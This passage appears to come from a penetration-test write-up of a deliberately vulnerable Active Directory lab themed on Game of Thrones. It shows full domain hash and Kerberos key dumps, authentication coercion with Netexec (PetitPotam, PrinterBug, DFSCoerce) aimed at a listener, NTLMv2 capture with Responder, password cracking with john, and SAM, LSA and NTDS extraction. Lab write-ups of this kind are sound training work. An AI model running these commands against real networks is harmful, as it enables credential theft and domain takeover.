+ 0010   58 69 29 AD 87 BA A5 9F  76 EB AC F3 07 63 71 5A   Xi).....v....cqZ
+ 0020   ED 26 C1 FC 5A 2B D3 25  A0 74 E6 E4 90 53 D5 19   .&..Z+.%.t...S..
+ 0030   E8 D6 BD D0 F3 36 76 5A  A6 74 1B 5B D8 30 90 2A   .....6vZ.t.[.0.*
+NL$KM:a0b9074a5570f9f9facc683015f595a2586929ad87baa59f76ebacf30763715aed26c1fc5a2bd325a074e6e49053d519e8d6bdd0f336765aa6741b5bd830902a
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7ffd25f5a6da8807343d76a3a2a1f792:::
+vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+arya.stark:1110:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
+eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
+catelyn.stark:1112:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
+robb.stark:1113:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
+sansa.stark:1114:aad3b435b51404eeaad3b435b51404ee:b777555c2e2e3716e075cc255b26c14d:::
+brandon.stark:1115:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::
+rickon.stark:1116:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::
+hodor:1117:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::
+jon.snow:1118:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::
+samwell.tarly:1119:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::
+jeor.mormont:1120:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::
+sql_svc:1121:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
+john:1122:aad3b435b51404eeaad3b435b51404ee:98da674948a73eb2cfa124e9aca27a03:::
+WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:1297c1d0587633fd51459d0af3cd508b:::
+CASTELBLACK$:1105:aad3b435b51404eeaad3b435b51404ee:f832d153d245e4805ea6b3b7cc366b8d:::
+SEVENKINGDOMS$:1104:aad3b435b51404eeaad3b435b51404ee:7c1eef765c8a0cdf437999d5fe9bb3ed:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:e7aa0f8a649aa96fab5ed9e65438392bfc549cb2695ac4237e97996823619972
+Administrator:aes128-cts-hmac-sha1-96:bb7b6aed58a7a395e0e674ac76c28aa0
+Administrator:des-cbc-md5:fe58cdcd13a43243
+krbtgt:aes256-cts-hmac-sha1-96:6bcaf8fd845ad27f0255049069f65c763cbd66b1d8aab97c591f22a7d0a5b8a2
+krbtgt:aes128-cts-hmac-sha1-96:0c512158994d2fb2eefed1727d9788e2
+krbtgt:des-cbc-md5:e613fea186a2265e
+vagrant:aes256-cts-hmac-sha1-96:aa97635c942315178db04791ffa240411c36963b5a5e775e785c6bd21dd11c24
+vagrant:aes128-cts-hmac-sha1-96:0d7c6160ffb016857b9af96c44110ab1
+vagrant:des-cbc-md5:16dc9e8ad3dfc47f
+arya.stark:aes256-cts-hmac-sha1-96:2001e8fb3da02f3be6945b4cce16e6abdd304974615d6feca7d135d4009d4f7d
+arya.stark:aes128-cts-hmac-sha1-96:8477cba28e7d7cfe5338d172a23d74df
+arya.stark:des-cbc-md5:13525243d6643285
+eddard.stark:aes256-cts-hmac-sha1-96:f6b4d01107eb34c0ecb5f07d804fa9959dce6643f8e4688df17623b847ec7fc4
+eddard.stark:aes128-cts-hmac-sha1-96:5f9b06a24b90862367ec221a11f92203
+eddard.stark:des-cbc-md5:8067f7abecc7d346
+catelyn.stark:aes256-cts-hmac-sha1-96:c8302e270b04252251de40b2bd5fba37395b55d5ed9ac95e03213dc739827283
+catelyn.stark:aes128-cts-hmac-sha1-96:50ce7e2ad069fa40fb2bc7f5f9643d93
+catelyn.stark:des-cbc-md5:6b314670a2f84cfb
+robb.stark:aes256-cts-hmac-sha1-96:d7df5069178bbc93fdc34bbbcb8e374fd75c44d6ce51000f24688925cc4d9c2a
+robb.stark:aes128-cts-hmac-sha1-96:b2965905e68356d63fedd9904357cc42
+robb.stark:des-cbc-md5:c4b62c797f5dd01f
+sansa.stark:aes256-cts-hmac-sha1-96:a268e7a385f4f165c6489c18a3bdeb52c5e505050449c6f9aeba4bc06a7fcbed
+sansa.stark:aes128-cts-hmac-sha1-96:e2e6e885f6f4d3e25d759ea624961392
+sansa.stark:des-cbc-md5:4c7c16e3f74cc4d3
+brandon.stark:aes256-cts-hmac-sha1-96:6dd181186b68898376d3236662f8aeb8fa68e4b5880744034d293d18b6753b10
+brandon.stark:aes128-cts-hmac-sha1-96:9de3581a163bd056073b71ab23142d73
+brandon.stark:des-cbc-md5:76e61fda8a4f5245
+rickon.stark:aes256-cts-hmac-sha1-96:79ffda34e5b23584b3bd67c887629815bb9ab8a1952ae9fda15511996587dcda
+rickon.stark:aes128-cts-hmac-sha1-96:d4a0669b1eff6caa42f2632ebca8cd8d
+rickon.stark:des-cbc-md5:b9ec3b8f2fd9d98a
+hodor:aes256-cts-hmac-sha1-96:a33579ec769f3d6477a98e72102a7f8964f09a745c1191a705d8e1c3ab6e4287
+hodor:aes128-cts-hmac-sha1-96:929126dcca8c698230b5787e8f5a5b60
+hodor:des-cbc-md5:d5764373f2545dfd
+jon.snow:aes256-cts-hmac-sha1-96:5a1bc13364e758131f87a1f37d2f1b1fa8aa7a4be10e3fe5a69e80a5c4c408fb
+jon.snow:aes128-cts-hmac-sha1-96:d8bc99ccfebe2d6e97d15f147aa50e8b
+jon.snow:des-cbc-md5:084358ceb3290d7c
+samwell.tarly:aes256-cts-hmac-sha1-96:b66738c4d2391b0602871d0a5cd1f9add8ff6b91dcbb7bc325dc76986496c605
+samwell.tarly:aes128-cts-hmac-sha1-96:3943b4ac630b0294d5a4e8b940101fae
+samwell.tarly:des-cbc-md5:5efed0e0a45dd951
+jeor.mormont:aes256-cts-hmac-sha1-96:be10f893afa35457fcf61ecc40dc032399b7aee77c87bb71dd2fe91411d2bd50
+jeor.mormont:aes128-cts-hmac-sha1-96:1b0a98958e19d6092c8e8dc1d25c788b
+jeor.mormont:des-cbc-md5:1a68641a3e9bb6ea
+sql_svc:aes256-cts-hmac-sha1-96:24d57467625d5510d6acfddf776264db60a40c934fcf518eacd7916936b1d6af
+sql_svc:aes128-cts-hmac-sha1-96:01290f5b76c04e39fb2cb58330a22029
+sql_svc:des-cbc-md5:8645d5cd402f16c7
+john:aes256-cts-hmac-sha1-96:8ba283d377a9a632bedc8d865bcb1ebdde885b2b5cf2734c6885dd8608a0a7d4
+john:aes128-cts-hmac-sha1-96:289d5135303e0167b7619f405cb05cdd
+john:des-cbc-md5:9ef47f9ed307e51c
+WINTERFELL$:aes256-cts-hmac-sha1-96:2e17a01ca562f69962cc1c2cf06783f0a44a2f393c95462aaf8d83a4bf2db764
+WINTERFELL$:aes128-cts-hmac-sha1-96:79341f379699e958de207213ca816fa9
+WINTERFELL$:des-cbc-md5:201ccee9f186f149
+CASTELBLACK$:aes256-cts-hmac-sha1-96:fbc7575b02575f95bc1a178e6f07e13070ec3f5d91b95345c06f397d881f6fcd
+CASTELBLACK$:aes128-cts-hmac-sha1-96:7d27b1e10337f7f36ff57d543d55a34c
+CASTELBLACK$:des-cbc-md5:d664d997c10d7acb
+SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:b18d828589dee687618bf74f561bf0a30730f1a39677370496bdd8a36317fd5d
+SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:bfcd3f3fddfd290d09adba14cbd50c1d
+SEVENKINGDOMS$:des-cbc-md5:7a265858ea9eb0d9
+[*] Cleaning up... 
+```
+
+#### **Vulnerabilities:**
+
+I was able to discover a number of vulnerabilities that are associated with the WINTERFELL machine using Netexec.
+
+```shellscript
+nxc smb 10.10.10.11 -u samwell.tarly -p Heartsbane -M coerce_plus                                                                 
+SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, DFSCoerce
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PetitPotam
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PrinterBug
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PrinterBug
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, MSEven
+```
+
+Running all attacks, I got back password hashes for eddard.stark, robb.stark and the Administrator account.
+
+```shellscript
+nxc smb 10.10.10.11 -u samwell.tarly -p Heartsbane -M coerce_plus -o LISTENER=10.10.10.131                                           ─╯
+SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, DFSCoerce
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, netdfs\NetrDfsRemoveRootTarget
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, netdfs\NetrDfsAddStdRoot
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, netdfs\NetrDfsRemoveStdRoot
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PetitPotam
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, efsrpc\EfsRpcAddUsersToFile
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PrinterBug
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
+COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, MSEven
+```
+
+```shellscript
+sudo responder -I eth1                                                                                                               
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
+
+  To support this project:
+  Github -> https://github.com/sponsors/lgandx
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+<< SNIP >>
+[SMB] NTLMv2-SSP Client   : 10.10.10.11
+[SMB] NTLMv2-SSP Username : NORTH\WINTERFELL$
+[SMB] NTLMv2-SSP Hash     : WINTERFELL$::NORTH:bf10913df7c0114e:4486FD3E6A73A0939EF75993EEB84738:0101000000000000800AF4ADDA65DC01706A1C6E81F3B59600000000020008004A00350059004F0001001E00570049004E002D0030004E00490043004A005A004900420059005700560004003400570049004E002D0030004E00490043004A005A00490042005900570056002E004A00350059004F002E004C004F00430041004C00030014004A00350059004F002E004C004F00430041004C00050014004A00350059004F002E004C004F00430041004C0007000800800AF4ADDA65DC010600040002000000080030003000000000000000000000000040000041DDF935E26AEBC62CE72382E0BE9955E83D077840709D60BC39E08F16A41EFB0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310030002E003100330031000000000000000000
+
+<< SNIP >>
+[SMB] NTLMv2-SSP Client   : fe80::5ce:7944:e1a:46dd
+[SMB] NTLMv2-SSP Username : NORTH\eddard.stark
+[SMB] NTLMv2-SSP Hash     : eddard.stark::NORTH:b59951e9dff1ac02:6FF4C58A937C20C11FA152CBFB94CE53:0101000000000000800AF4ADDA65DC01B157D99482CD820000000000020008004A00350059004F0001001E00570049004E002D0030004E00490043004A005A004900420059005700560004003400570049004E002D0030004E00490043004A005A00490042005900570056002E004A00350059004F002E004C004F00430041004C00030014004A00350059004F002E004C004F00430041004C00050014004A00350059004F002E004C004F00430041004C0007000800800AF4ADDA65DC010600040002000000080030003000000000000000000000000030000041DDF935E26AEBC62CE72382E0BE9955E83D077840709D60BC39E08F16A41EFB0A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000
+
+<< SNIP >>
+[SMB] NTLMv2-SSP Client   : fe80::5ce:7944:e1a:46dd
+[SMB] NTLMv2-SSP Username : NORTH\robb.stark
+[SMB] NTLMv2-SSP Hash     : robb.stark::NORTH:218fd664f14b7a4e:853E54E69F87630F9FC6C0186BDD5E12:0101000000000000800AF4ADDA65DC013FCC9152036A475E00000000020008004A00350059004F0001001E00570049004E002D0030004E00490043004A005A004900420059005700560004003400570049004E002D0030004E00490043004A005A00490042005900570056002E004A00350059004F002E004C004F00430041004C00030014004A00350059004F002E004C004F00430041004C00050014004A00350059004F002E004C004F00430041004C0007000800800AF4ADDA65DC010600040002000000080030003000000000000000000000000030000041DDF935E26AEBC62CE72382E0BE9955E83D077840709D60BC39E08F16A41EFB0A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000
+```
+
+Because Robb.stark is admin, he can get the hashes for all users. like the one from eddard.stark.
+
+```shellscript
+nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy' --ntds --user eddard.stark                                                                                       
+SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
+SMB         10.10.10.11     445    WINTERFELL       [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.10.10.11     445    WINTERFELL       eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
+SMB         10.10.10.11     445    WINTERFELL       [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/ntds/WINTERFELL_10.10.10.11_2025-12-05_155916.ntds of which 1 were added to the database
+SMB         10.10.10.11     445    WINTERFELL       [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         10.10.10.11     445    WINTERFELL       [*] cat /home/kali/.nxc/logs/ntds/WINTERFELL_10.10.10.11_2025-12-05_155916.ntds | grep -iv disabled | cut -d ':' -f1
+SMB         10.10.10.11     445    WINTERFELL       [*] grep -iv disabled /home/kali/.nxc/logs/ntds/WINTERFELL_10.10.10.11_2025-12-05_155916.ntds | cut -d ':' -f1
+```
+
+I was able to crack robb.stark credentials and pwned the WINTERFELL machine.
+
+```shellscript
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt robb-stark.hash                                                                                  
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sexywolfy        (robb.stark)     
+1g 0:00:00:00 DONE (2025-12-05 12:25) 2.325g/s 3019Kp/s 3019Kc/s 3019KC/s shaker21..sexytime1234
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+```
+
+```shellscript
+nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy'                                                                                                                    
+SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
+
+
+nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy' --shares                                                                                                           
+SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
+SMB         10.10.10.11     445    WINTERFELL       [*] Enumerated shares
+SMB         10.10.10.11     445    WINTERFELL       Share           Permissions     Remark
+SMB         10.10.10.11     445    WINTERFELL       -----           -----------     ------
+SMB         10.10.10.11     445    WINTERFELL       ADMIN$          READ,WRITE      Remote Admin
+SMB         10.10.10.11     445    WINTERFELL       C$              READ,WRITE      Default share
+SMB         10.10.10.11     445    WINTERFELL       IPC$            READ            Remote IPC
+SMB         10.10.10.11     445    WINTERFELL       NETLOGON        READ,WRITE      Logon server share 
+SMB         10.10.10.11     445    WINTERFELL       SYSVOL          READ,WRITE      Logon server share 
+```
+
+## **Foothold**
+
+Research findings, data insights, and key considerations and document how you got a foothold on the vulnerable box
+
+#### **Extracting Hashes from SAM Database.**
+
+```shellscript
+nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy' --sam                                                                                                              ─╯
+SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
+SMB         10.10.10.11     445    WINTERFELL       [*] Dumping SAM hashes
+SMB         10.10.10.11     445    WINTERFELL       Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+SMB         10.10.10.11     445    WINTERFELL       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.11     445    WINTERFELL       DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[12:48:52] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                                   regsecrets.py:436
+SMB         10.10.10.11     445    WINTERFELL       [+] Added 3 SAM hashes to the database
+```
+
+#### **Dumping the Local User’s password hash**
+
+```shellscript
+nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy' --lsa                                                                                                             
+SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
+SMB         10.10.10.11     445    WINTERFELL       [+] Dumping LSA secrets
+SMB         10.10.10.11     445    WINTERFELL       NORTH\WINTERFELL$:aes256-cts-hmac-sha1-96:40aaf0701af5d16a5fd818ecffe11a56a1189474e6d5ed1fc85ca32ce9a6d0a7
+SMB         10.10.10.11     445    WINTERFELL       NORTH\WINTERFELL$:aes128-cts-hmac-sha1-96:744c6cf0bd5a1563b9ece25e226defd0
+SMB         10.10.10.11     445    WINTERFELL       NORTH\WINTERFELL$:des-cbc-md5:195716ab31896b0e
+SMB         10.10.10.11     445    WINTERFELL       NORTH\WINTERFELL$:plain_password_hex:f0bddd1fbd0c86486945b66c7187e1cc7894ae9b8c474fb0696ff202d95438369df613dc4167005425ad3f820c44188b96130a9a0ee3e17ff9103042bf9590b99eb36248fbf1036617fd1cf6c6d8c554b6c675b1044c32ff998c9802b80adb10bec54bf7304e299018e1ec381593a96dd36587f45983ea6158b50648f99998195ce125d194a8b15857b93407f03fe0c16d44fb2213bdc48e6a875a2d00e538919c7e4151c6c744bad8683fd5b21fc8c51decd55236dd423bfa470ec4ee10e638f92ea28b3f20a4bd35c201911060099bbb1bcb1d7f87144b39a4f84694abe0e468c93a9f1e34660bc5bd7576fb4bfe73
+SMB         10.10.10.11     445    WINTERFELL       NORTH\WINTERFELL$:aad3b435b51404eeaad3b435b51404ee:5d43c3d692608fef8fab6fb766b2bd10:::
+SMB         10.10.10.11     445    WINTERFELL       NORTH\robb.stark:sexywolfy
+SMB         10.10.10.11     445    WINTERFELL       dpapi_machinekey:0xa07dedba3f42b271fbb70b6712eaec73474ed8c7
+dpapi_userkey:0x1883acd917d81da855076b023f86c1892f3ba2fa
+```
